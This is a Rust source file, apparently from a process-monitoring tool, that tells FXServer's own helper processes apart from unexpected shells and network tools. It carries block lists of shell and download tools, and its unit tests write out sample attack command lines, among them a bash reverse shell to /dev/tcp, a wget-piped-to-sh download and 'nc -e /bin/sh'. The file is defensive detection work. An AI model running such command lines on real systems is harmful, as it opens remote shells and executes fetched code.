//! What the processes FXServer's tree starts are: its own helpers, or programs it never starts by
//! itself. The lists are closed: anything not known is unexpected.

use std::path::{Path, PathBuf};

use observer_domain::diagnostics::ProcessKind;
use observer_platform::ProcessInfo;

use crate::layout::{Flavour, Layout};

/// Windows programs a backdoor runs: shells, script hosts, and the tools that fetch or launch.
const WINDOWS_SHELLS: [&str; 16] = [
    "cmd",
    "powershell",
    "pwsh",
    "wscript",
    "cscript",
    "mshta",
    "rundll32",
    "regsvr32",
    "certutil",
    "bitsadmin",
    "curl",
    "wmic",
    "schtasks",
    "bash",
    "sh",
    "wsl",
];
const LINUX_SHELLS: [&str; 20] = [
    "sh", "bash", "dash", "zsh", "ash", "ksh", "fish", "busybox", "perl", "ruby", "node", "nodejs", "curl",
    "wget", "nc", "ncat", "netcat", "socat", "telnet", "crontab",
];
/// Interpreters whose name carries a version: `python3.11`, `php8.2`.
const LINUX_SHELL_PREFIXES: [&str; 2] = ["python", "php"];

/// What a run's processes are compared against.
#[derive(Debug, Clone)]
pub struct TreeContext {
    pub flavour: Flavour,
    pub main_pid: u32,
    /// `FXServer.exe`, or the Linux build's `FXServer` binary.
    pub fxserver: PathBuf,
    /// The Linux build's own loader, which runs FXServer.
    pub loader: Option<PathBuf>,
    pub run_sh: Option<PathBuf>,
    /// `%SystemRoot%`, where the only console host FXServer starts lives.
    pub system_root: Option<PathBuf>,
}

impl TreeContext {
    pub fn new(layout: &Layout, main_pid: u32) -> Self {
        let root = layout.citizen_root();
        match layout.flavour() {
            Flavour::Windows => Self {
                flavour: Flavour::Windows,
                main_pid,
                fxserver: canonical(&root.join("FXServer.exe")),
                loader: None,
                run_sh: None,
                system_root: std::env::var_os("SystemRoot").map(|root| canonical(Path::new(&root))),
            },
            Flavour::Linux => Self {
                flavour: Flavour::Linux,
                main_pid,
                fxserver: canonical(&root.join("FXServer")),
                loader: Some(canonical(&root.join("ld-musl-x86_64.so.1"))),
                run_sh: Some(canonical(&layout.build().join("run.sh"))),
                system_root: None,
            },
        }
    }

    fn same(&self, path: &Path, known: &Path) -> bool {
        let (path, known) = (plain(path), plain(known));
        match self.flavour {
            Flavour::Windows => path
                .replace('/', "\\")
                .eq_ignore_ascii_case(&known.replace('/', "\\")),
            Flavour::Linux => lexical(&path) == lexical(&known),
        }
    }
}

/// What `process` is, the first rule that matches. Reads the file system to resolve its image.
pub fn classify(process: &ProcessInfo, context: &TreeContext) -> ProcessKind {
    // A path may be given in its short 8.3 form, or through a link.
    let resolved = process.image.as_deref().map(canonical);
    let image = resolved.as_deref();
    let args = &process.args;
    let has = |prefix: &str| args.iter().skip(1).any(|arg| arg.starts_with(prefix));
    let is = |known: &Path| image.is_some_and(|image| context.same(image, known));
    match context.flavour {
        Flavour::Windows => {
            if is(&context.fxserver) && has("-dumpserver:") && has("-parentpid:") {
                return ProcessKind::DumpServer;
            }
            let conhost = context
                .system_root
                .as_ref()
                .map(|root| root.join("System32").join("conhost.exe"));
            if conhost.as_deref().is_some_and(is) && process.parent == Some(context.main_pid) {
                return ProcessKind::ConsoleHost;
            }
            if is(&context.fxserver) && has("--start-node") {
                return ProcessKind::Node;
            }
            let name = image.and_then(windows_name).map(|name| {
                let lower = name.to_ascii_lowercase();
                lower
                    .strip_suffix(".exe")
                    .map_or_else(|| lower.clone(), str::to_owned)
            });
            if name.is_some_and(|name| WINDOWS_SHELLS.contains(&name.as_str())) {
                return ProcessKind::Shell;
            }
            ProcessKind::Other
        }
        Flavour::Linux => {
            // Where the build's FXServer is named in argv: run as itself, or by the build's loader.
            let loaded = context
                .loader
                .as_deref()
                .is_some_and(is)
                .then(|| loaded_program(args))
                .flatten();
            let binary = if is(&context.fxserver) {
                Some(0)
            } else {
                loaded.filter(|&at| context.same(Path::new(&args[at]), &context.fxserver))
            };
            // A shell running the build's run.sh as its script, before any other argument. FXServer
            // names it from its own folder, `…/opt/cfx-server/../../../run.sh`, which the kernel
            // hands the shell as given.
            let script = (image
                .and_then(file_name)
                .is_some_and(|name| ["sh", "bash", "dash"].contains(&name))
                && args
                    .get(1)
                    .filter(|script| script.starts_with('/'))
                    .zip(context.run_sh.as_deref())
                    .is_some_and(|(script, run_sh)| context.same(&canonical(Path::new(script)), run_sh)))
            .then_some(1);
            // FXServer's own flags come after the program they are given to.
            let after = |program: Option<usize>, prefix: &str| {
                program.is_some_and(|at| args.iter().skip(at + 1).any(|arg| arg.starts_with(prefix)))
            };
            if [binary, script]
                .into_iter()
                .any(|program| after(program, "-dumpserver:") && after(program, "-parentppe:"))
            {
                return ProcessKind::DumpServer;
            }
            if after(binary, "--start-node") {
                return ProcessKind::Node;
            }
            let names = [
                image.and_then(file_name),
                args.first().and_then(|arg| file_name(Path::new(arg))),
                loaded.and_then(|at| file_name(Path::new(&args[at]))),
            ];
            if names.into_iter().flatten().any(linux_shell) {
                return ProcessKind::Shell;
            }
            ProcessKind::Other
        }
    }
}

/// Where the program the musl loader runs is in its argv: the first argument after the loader's
/// options (`--library-path`, `--preload` and `--argv0`, each with its value, up to a bare `--`).
/// `None` when the loader runs nothing: `--list`, an option it does not know, or no program.
fn loaded_program(args: &[String]) -> Option<usize> {
    let mut at = 1;
    while let Some(option) = args.get(at).and_then(|arg| arg.strip_prefix("--")) {
        at += 1;
        match option {
            "" => break,
            "library-path" | "preload" | "argv0" => at += 1,
            _ if ["library-path=", "preload=", "argv0="]
                .iter()
                .any(|with_value| option.starts_with(with_value)) => {}
            _ => return None,
        }
    }
    (at < args.len()).then_some(at)
}

fn linux_shell(name: &str) -> bool {
    LINUX_SHELLS.contains(&name)
        || LINUX_SHELL_PREFIXES.iter().any(|prefix| {
            name.strip_prefix(prefix)
                .is_some_and(|version| version.chars().all(|c| c.is_ascii_digit() || c == '.'))
        })
}

fn file_name(path: &Path) -> Option<&str> {
    path.file_name()?.to_str()
}

/// A Windows path's file name, wherever it is read.
fn windows_name(path: &Path) -> Option<&str> {
    path.to_str()?.rsplit(['\\', '/']).next()
}

/// The path as the system resolves it, when it exists.
fn canonical(path: &Path) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| path.to_owned())
}

/// Without Windows' verbatim prefix, which canonical paths carry and process images do not.
fn plain(path: &Path) -> String {
    let text = path.to_string_lossy();
    text.strip_prefix(r"\\?\").unwrap_or(&text).to_owned()
}

/// A Linux path with its `.` and `..` resolved as written. A path that exists was made canonical
/// before, links included; this one may not exist, or be read on Windows.
fn lexical(path: &str) -> String {
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            part => parts.push(part),
        }
    }
    let joined = parts.join("/");
    if path.starts_with('/') {
        format!("/{joined}")
    } else {
        joined
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn windows() -> TreeContext {
        TreeContext {
            flavour: Flavour::Windows,
            main_pid: 3312,
            fxserver: PathBuf::from(r"C:\lab\build\FXServer.exe"),
            loader: None,
            run_sh: None,
            system_root: Some(PathBuf::from(r"C:\WINDOWS")),
        }
    }

    fn linux() -> TreeContext {
        TreeContext {
            flavour: Flavour::Linux,
            main_pid: 7,
            fxserver: PathBuf::from("/srv/fx/alpine/opt/cfx-server/FXServer"),
            loader: Some(PathBuf::from("/srv/fx/alpine/opt/cfx-server/ld-musl-x86_64.so.1")),
            run_sh: Some(PathBuf::from("/srv/fx/run.sh")),
            system_root: None,
        }
    }

    fn process(image: &str, parent: u32, args: &[&str]) -> ProcessInfo {
        ProcessInfo {
            pid: 4120,
            parent: Some(parent),
            image: Some(PathBuf::from(image)),
            args: args.iter().map(ToString::to_string).collect(),
            command_line: Some(args.join(" ")),
            created_ms: None,
            stamp: None,
        }
    }

    #[test]
    fn the_lab_s_windows_helpers_are_known() {
        let context = windows();

        assert_eq!(
            classify(
                &process(
                    r"C:\lab\build\FXServer.exe",
                    3312,
                    &[r"C:\lab\build\FXServer.exe", "-dumpserver:408", "-parentpid:3312"]
                ),
                &context
            ),
            ProcessKind::DumpServer
        );
        assert_eq!(
            classify(
                &process(
                    r"C:\Windows\System32\conhost.exe",
                    3312,
                    &[r"\??\C:\WINDOWS\system32\conhost.exe", "0x4"]
                ),
                &context
            ),
            ProcessKind::ConsoleHost
        );
        assert_eq!(
            classify(
                &process(
                    r"C:\lab\build\fxserver.exe",
                    3312,
                    &["FXServer.exe", "--start-node", "x"]
                ),
                &context
            ),
            ProcessKind::Node
        );
    }

    #[test]
    fn a_console_host_elsewhere_or_from_another_parent_is_unexpected() {
        let context = windows();

        assert_eq!(
            classify(
                &process(r"C:\lab\build\conhost.exe", 3312, &["conhost.exe", "0x4"]),
                &context
            ),
            ProcessKind::Other
        );
        assert_eq!(
            classify(
                &process(r"C:\Windows\System32\conhost.exe", 5000, &["conhost.exe"]),
                &context
            ),
            ProcessKind::Other
        );
    }

    #[test]
    fn shells_raise_an_alert_whatever_their_case() {
        let context = windows();

        for image in [
            r"C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.EXE",
            r"C:\Windows\System32\cmd.exe",
            r"C:\Windows\System32\certutil.exe",
        ] {
            assert_eq!(
                classify(&process(image, 3312, &["x", "-enc", "SQBFAFgA"]), &context),
                ProcessKind::Shell,
                "{image}"
            );
        }
        assert_eq!(
            classify(&process(r"C:\tools\backup.exe", 3312, &["backup.exe"]), &context),
            ProcessKind::Other
        );
        assert_eq!(
            classify(
                &process(
                    r"C:\lab\build\FXServer.exe",
                    3312,
                    &["FXServer.exe", "-dumpserver:408"]
                ),
                &context
            ),
            ProcessKind::Other,
            "a dump server names its parent"
        );
    }

    #[test]
    fn the_lab_s_linux_dump_server_is_known_through_the_loader_run_sh_or_the_binary() {
        let context = linux();
        let loader = "/srv/fx/alpine/opt/cfx-server/ld-musl-x86_64.so.1";
        let line = [
            loader,
            "--library-path",
            "/srv/fx/alpine/usr/lib/v8/:/srv/fx/alpine/lib/:/srv/fx/alpine/usr/lib/",
            "--",
            "/srv/fx/alpine/opt/cfx-server/FXServer",
            "+set",
            "citizen_dir",
            "/srv/fx/alpine/opt/cfx-server/citizen/",
            "-dumpserver:5",
            "-parentppe:7",
        ];

        assert_eq!(
            classify(&process(loader, 7, &line), &context),
            ProcessKind::DumpServer
        );
        assert_eq!(
            classify(
                &process(
                    "/srv/fx/alpine/opt/cfx-server/FXServer",
                    7,
                    &["FXServer", "-dumpserver:5", "-parentppe:7"]
                ),
                &context
            ),
            ProcessKind::DumpServer
        );
        assert_eq!(
            classify(
                &process(
                    "/bin/bash",
                    7,
                    &["bash", "/srv/fx/run.sh", "-dumpserver:5", "-parentppe:7"]
                ),
                &context
            ),
            ProcessKind::DumpServer
        );
        // run.sh started through its `#!/bin/sh` line, where /bin/sh is dash.
        assert_eq!(
            classify(
                &process(
                    "/usr/bin/dash",
                    7,
                    &["/bin/sh", "/srv/fx/run.sh", "-dumpserver:5", "-parentppe:7"]
                ),
                &context
            ),
            ProcessKind::DumpServer
        );
        assert_eq!(
            classify(
                &process(
                    loader,
                    7,
                    &[loader, "--", "/tmp/other", "-dumpserver:5", "-parentppe:7"]
                ),
                &context
            ),
            ProcessKind::Other
        );
    }

    #[test]
    fn the_run_sh_fxserver_names_from_its_own_folder_is_the_build_s() {
        let context = linux();
        let dump_server = |script: &str| {
            classify(
                &process(
                    "/usr/bin/bash",
                    7,
                    &["/bin/bash", script, "-dumpserver:5", "-parentppe:7"],
                ),
                &context,
            )
        };

        assert_eq!(
            dump_server("/srv/fx/alpine/opt/cfx-server/../../../run.sh"),
            ProcessKind::DumpServer
        );
        assert_eq!(dump_server("/srv/fx/./alpine/../run.sh"), ProcessKind::DumpServer);
        assert_eq!(
            dump_server("/srv/fx/alpine/opt/cfx-server/../../run.sh"),
            ProcessKind::Shell
        );
        assert_eq!(
            dump_server("run.sh"),
            ProcessKind::Shell,
            "a relative script is found from the shell's folder, which may be a resource's"
        );
    }

    #[test]
    fn a_shell_that_names_run_sh_or_fxserver_somewhere_in_its_arguments_is_still_a_shell() {
        let context = linux();
        let loader = "/srv/fx/alpine/opt/cfx-server/ld-musl-x86_64.so.1";

        assert_eq!(
            classify(
                &process(
                    "/usr/bin/bash",
                    7,
                    &[
                        "bash",
                        "-c",
                        "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
                        "/srv/fx/run.sh",
                        "-dumpserver:0",
                        "-parentppe:1"
                    ]
                ),
                &context
            ),
            ProcessKind::Shell
        );
        // musl's loader runs its first argument that is not one of its options.
        assert_eq!(
            classify(
                &process(
                    loader,
                    7,
                    &[
                        loader,
                        "/srv/fx/alpine/bin/busybox",
                        "sh",
                        "-c",
                        "wget -qO- http://203.0.113.5/x | sh",
                        "--",
                        "/srv/fx/alpine/opt/cfx-server/FXServer",
                        "-dumpserver:0",
                        "-parentppe:1"
                    ]
                ),
                &context
            ),
            ProcessKind::Shell
        );
        assert_eq!(
            classify(
                &process(
                    loader,
                    7,
                    &[
                        loader,
                        "/srv/fx/alpine/bin/busybox",
                        "sh",
                        "-c",
                        "id",
                        "--",
                        "/srv/fx/alpine/opt/cfx-server/FXServer",
                        "--start-node"
                    ]
                ),
                &context
            ),
            ProcessKind::Shell
        );
        assert_eq!(
            classify(
                &process(
                    loader,
                    7,
                    &[
                        loader,
                        "/srv/fx/alpine/opt/cfx-server/FXServer",
                        "--",
                        "/tmp/x",
                        "-dumpserver:0"
                    ]
                ),
                &context
            ),
            ProcessKind::Other,
            "FXServer's flags count only when FXServer is given them"
        );
    }

    #[test]
    fn the_loader_s_own_options_are_read_as_musl_reads_them() {
        let args = |line: &[&str]| line.iter().map(ToString::to_string).collect::<Vec<_>>();

        assert_eq!(
            loaded_program(&args(&["ld", "--library-path", "/a:/b", "--", "/fx/FXServer"])),
            Some(4)
        );
        assert_eq!(
            loaded_program(&args(&[
                "ld",
                "--preload=/x.so",
                "--argv0",
                "FXServer",
                "/fx/FXServer"
            ])),
            Some(4)
        );
        assert_eq!(
            loaded_program(&args(&["ld", "/bin/sh", "--", "/fx/FXServer"])),
            Some(1)
        );
        assert_eq!(loaded_program(&args(&["ld", "--list", "/fx/FXServer"])), None);
        assert_eq!(loaded_program(&args(&["ld", "--unknown", "/fx/FXServer"])), None);
        assert_eq!(loaded_program(&args(&["ld", "--library-path"])), None);
    }

    #[test]
    fn linux_interpreters_and_network_tools_raise_an_alert() {
        let context = linux();

        assert_eq!(
            classify(
                &process("/usr/bin/python3.11", 7, &["python3", "-c", "import os"]),
                &context
            ),
            ProcessKind::Shell
        );
        assert_eq!(
            classify(&process("/bin/busybox", 7, &["sh", "-c", "id"]), &context),
            ProcessKind::Shell
        );
        assert_eq!(
            classify(
                &process("/usr/local/bin/tool", 7, &["nc", "-e", "/bin/sh"]),
                &context
            ),
            ProcessKind::Shell,
            "a renamed program is caught by its argv[0]"
        );
        assert_eq!(
            classify(&process("/usr/bin/pythonista", 7, &["pythonista"]), &context),
            ProcessKind::Other
        );
        assert_eq!(
            classify(&process("/usr/bin/ffmpeg", 7, &["ffmpeg", "-i", "x"]), &context),
            ProcessKind::Other
        );
    }
}
